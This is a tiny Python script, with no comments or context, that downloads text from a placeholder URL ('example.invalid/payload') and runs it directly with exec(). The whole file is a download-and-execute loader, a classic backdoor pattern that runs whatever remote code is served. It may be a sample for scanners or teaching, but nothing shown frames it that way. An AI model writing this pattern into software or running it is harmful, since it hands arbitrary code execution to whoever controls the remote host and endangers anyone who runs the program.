import requests


data = requests.get("https://example.invalid/payload", timeout=1).text
exec(data)
